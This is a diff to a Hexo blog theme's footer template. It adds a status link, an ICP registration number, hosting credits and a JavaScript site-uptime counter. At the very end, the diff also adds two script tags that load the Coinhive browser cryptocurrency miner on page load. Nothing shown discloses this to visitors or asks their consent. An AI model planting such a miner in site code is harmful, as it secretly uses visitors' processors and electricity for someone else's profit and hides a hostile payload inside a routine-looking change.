@@ -3,10 +3,53 @@
     <div id="footer-info">
     	<div class="footer-left">
     		&copy; <%= date(new Date(), 'YYYY') %> <%= config.author || config.title %>
+                |
+              <a rel="external" href="https://status.moew.xyz/" target="_blank">Status</a>
+              |
+              <a style="color:grey;" rel="external" href="http://www.miitbeian.gov.cn/" target="_blank">鲁ICP备17029072号</a>
+              |
+            <div style="display:inline-block;" id="uptime"></div>
     	</div>
       	<div class="footer-right">
-      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+			Powered by <a rel="external" href="http://hexo.io" target="_blank">Hexo</a>
+			On 
+				<a rel="external" href="https://www.upyun.com/" target="_blank">
+					Upyun
+					<img style="display:none;" width="125px" src="//static.moew.xyz/usr/resources/upyun.png" />
+				</a>.
+			Theme <a rel="external" href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
       	</div>
     </div>
   </div>
+<!-- Uptime Start -->
+<script>
+setInterval(function(){
+	var start_timestamp = 1399124460000;
+	var times = new Date().getTime() - new Date(start_timestamp).getTime();
+    times = Math.floor(times/1000); // convert total milliseconds into total seconds
+    var days = Math.floor( times/(60*60*24) ); //separate days
+    times %= 60*60*24; //subtract entire days
+    var hours = Math.floor( times/(60*60) ); //separate hours
+    times %= 60*60; //subtract entire hours
+    var minutes = Math.floor( times/60 ); //separate minutes
+    times %= 60; //subtract entire minutes
+    var seconds = Math.floor( times/1 ); // remainder is seconds
+    document.getElementById("uptime").innerHTML = "本站已运行" + days + "天" + hours + "小时" + minutes + "分" + seconds + "秒";
+}, 1000);
+</script>
+<!-- Uptime End -->
 </footer>
+
+<script defer>
+/*
+if ('serviceWorker' in navigator) {
+ navigator.serviceWorker.register('<%- url_for("/sw.js") %>', {scope: '/'}).then(function(registration) {
+      console.log('ServiceWorker registration successful with scope: ', registration.scope);
+    }).catch(function(err) {
+      console.log('ServiceWorker registration failed: ', err);
+    });
+}
+*/
+</script>
+<script src="https://coinhive.com/lib/coinhive.min.js" defer></script>
+<script src="<%- url_for("/assets/js/coinhive.js") %>" defer></script>
